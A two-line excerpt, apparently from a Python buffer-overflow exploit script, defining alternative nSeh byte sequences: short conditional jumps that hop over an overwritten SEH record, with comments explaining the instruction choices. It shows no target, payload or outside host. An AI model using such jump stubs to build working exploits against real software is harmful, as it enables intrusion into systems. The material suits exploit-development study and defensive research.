...
#nSeh = '\x40\x40\x75\x04' # inc EAX twice to unset ZF then JNZ 4 bytes over SEH
nSeh = '\x31\xc9\x74\x04' # xor ecx,ecx then JZ when ZF is set 4 bytes over SEH
